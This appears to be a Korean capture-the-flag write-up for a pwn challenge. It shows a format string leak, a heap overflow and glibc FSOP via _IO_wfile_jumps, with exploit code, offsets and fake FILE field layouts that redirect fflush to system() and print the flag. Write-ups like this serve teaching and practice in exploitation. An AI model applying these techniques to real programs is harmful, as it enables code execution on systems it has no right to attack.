# 67_login_system Writeup

## TL;DR

- `show` 메뉴에 format string bug와 raw heap leak이 같이 있다.
- `update` 메뉴에서 `0x48` 크기 user chunk에 `0x200` 바이트를 써서 heap overflow가 가능하다.
- 각 user chunk 뒤에는 `fopen("/dev/null", "a")`로 만들어진 `FILE` 구조체가 붙는다.
- `login` 메뉴가 `fwrite`/`fflush`를 `*(user + 0x40)` 포인터로 호출한다.
- overflow로 `*(user + 0x40)`를 user chunk 자신으로 바꾸고, user chunk 안에 fake `FILE`을 만든다.
- `_IO_wfile_jumps` 기반 FSOP로 `system(" cat /flag.txt;sleep 9")`를 호출한다.

최종 플래그:

```text
NHNC{0x67676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767_sixseven!!!}
```

## 바이너리 구조

보호 기법은 PIE가 켜져 있고, 바이너리는 stripped 상태였다. 섹션 헤더도 없어서 정적 분석은 Ghidra에 올려서 함수 단위로 확인했다.

핵심 메뉴는 네 개다.

### register

```c
user = malloc(0x48);
memset(user, 0, 0x48);
fp = fopen("/dev/null", "a");
read(0, user, 0x40);
*(FILE **)(user + 0x40) = fp;
users[idx] = user;
```

user chunk 크기는 `0x48`이고, 마지막 `+0x40` 위치에 `FILE *`가 저장된다.

### show

```c
printf("username: ");
printf(user);
putc('\n', stdout);
write(1, user, 0x48);
```

여기서 두 가지 leak이 생긴다.

- `printf(user)` 때문에 format string leak 가능
- `write(1, user, 0x48)` 때문에 `user + 0x40`에 저장된 `FILE *` leak 가능

### update

```c
read(0, user, 0x200);
```

할당 크기는 `0x48`인데 `0x200` 바이트를 입력받기 때문에 heap overflow가 가능하다.

### login

```c
fwrite("login\n", 1, 6, *(FILE **)(user + 0x40));
fflush(*(FILE **)(user + 0x40));
puts("welcome!");
```

`*(user + 0x40)`를 조작하면 `fwrite`와 `fflush`가 fake `FILE`을 대상으로 동작한다.

## Leak

처음 등록할 username을 다음처럼 넣는다.

```text
%11$p.%15$p
```

로컬/도커 libc 기준으로 leak은 다음처럼 계산됐다.

```python
libc_base = leak_11 - 0x27741
pie_base  = leak_15 - 0x1641
```

그리고 `show`의 raw dump에서 `user + 0x40` 값을 읽으면 실제 `FILE *`가 나온다.

heap 배치는 다음처럼 잡힌다.

```text
user chunk:  user
FILE object: user + 0x50
```

따라서:

```python
fp = u64(raw[0x40:0x48])
user = fp - 0x50
```

이 heap 주소를 이용해 fake `FILE`, fake wide data, fake wide vtable을 모두 user chunk 내부에 배치한다.

## libc 심볼

컨테이너에서 사용하는 libc를 `chal/libc.so.6`로 가져와 exploit에서 그대로 사용했다.

사용한 주요 심볼:

```text
system          = libc_base + 0x54100
_IO_wfile_jumps = libc_base + 0x211228
```

`pwntools`에서는 다음처럼 참조했다.

```python
LIBC.sym.system
LIBC.sym._IO_wfile_jumps
```

## Exploit Strategy

목표는 `login`의 `fflush(fake_file)` 호출에서 control flow를 `system(fake_file)`로 보내는 것이다.

payload 시작 부분에는 command string을 둔다.

```python
command = b" cat /flag.txt;sleep 9\x00"
```

앞에 공백이 필요한 이유는 `_IO_wdoallocbuf` 경로에서 fake `FILE`의 첫 바이트 조건을 통과시키기 위해서다. 또한 command는 offset `0x20` 전에 끝나야 한다. `0x20`부터는 fake `FILE` 필드로 사용하기 때문이다.

fake `FILE`의 주요 필드는 다음과 같이 세팅한다.

```python
qword(payload, 0x20, user + 0x100)  # _IO_write_base
qword(payload, 0x28, user + 0x100)  # _IO_write_ptr
qword(payload, 0x30, user + 0x140)  # _IO_write_end
qword(payload, 0x38, user + 0x100)  # _IO_buf_base
qword(payload, 0x40, user)          # login이 읽는 FILE*
qword(payload, 0x48, 0x1E1)         # 다음 chunk size 보존
dword(payload, 0x70, 1)             # fileno
qword(payload, 0x88, user + 0x1E8)  # lock
qword(payload, 0xA0, wide_data)     # _wide_data
dword(payload, 0xC0, 1)             # _mode
```

vtable은 그냥 `_IO_wfile_jumps`가 아니라 `-0x48`을 해서 넣는다.

```python
qword(payload, 0xD8, libc_base + LIBC.sym._IO_wfile_jumps - 0x48)
```

이렇게 하면 `fflush`에서 사용하는 sync slot이 `_IO_wfile_overflow`로 떨어진다.

그 뒤 wide path를 타면서 다음 흐름이 만들어진다.

```text
fflush(fake_file)
-> _IO_wfile_overflow(fake_file)
-> _IO_wdoallocbuf(fake_file)
-> fake_wide_vtable[0x68](fake_file)
-> system(fake_file)
```

wide data와 fake wide vtable은 user chunk 뒤쪽에 둔다.

```python
wide_data = user + 0xE0
wide_vtable = user + 0x170

qword(payload, 0xE0 + 0x18, 0)
qword(payload, 0xE0 + 0x20, 0)
qword(payload, 0xE0 + 0x30, 0)
qword(payload, 0xE0 + 0xE0, wide_vtable)
qword(payload, 0x170 + 0x68, libc_base + LIBC.sym.system)
```

## 긴 플래그 출력 처리

처음에는 `cat /flag.txt`만 실행하면 fake `FILE` 때문에 `system()` 반환 이후 프로세스가 크래시하면서 원격 출력이 일부 잘릴 수 있었다.

그래서 command를 다음처럼 바꿨다.

```python
command = b" cat /flag.txt;sleep 9\x00"
```

`system()`은 shell command가 끝날 때까지 기다리므로, `cat` 출력 후 `sleep 9` 동안 원격 stdout이 충분히 전송된다. exploit 쪽에서도 `recvall(timeout=12)`로 넉넉하게 받는다.

## 최종 Exploit

최종 exploit은 [exploit.py](./exploit.py)에 있다.

실행:

```bash
python3 exploit.py
```

출력:

```text
NHNC{0x67676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767_sixseven!!!}
```
